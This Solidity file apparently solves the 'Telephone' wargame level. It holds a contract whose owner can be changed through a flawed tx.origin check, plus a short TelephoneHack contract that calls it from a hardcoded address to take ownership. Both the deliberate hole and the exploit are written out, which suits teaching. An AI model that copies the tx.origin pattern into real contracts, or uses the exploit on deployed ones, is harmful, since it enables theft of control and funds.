// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHack {
  address constant telephoneContract = 0xABE3739d1118335D92bb8d2Acf681189F9d9dc4e;

  function claimTelephone() public {
      Telephone(telephoneContract).changeOwner(msg.sender);
  }
}